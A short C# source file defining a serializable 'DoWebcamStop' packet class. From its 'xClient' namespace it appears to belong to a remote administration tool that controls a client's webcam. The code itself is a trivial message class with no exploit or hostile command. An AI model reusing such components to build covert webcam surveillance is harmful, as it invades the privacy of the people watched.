﻿using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoWebcamStop : IPacket
    {
        public DoWebcamStop()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
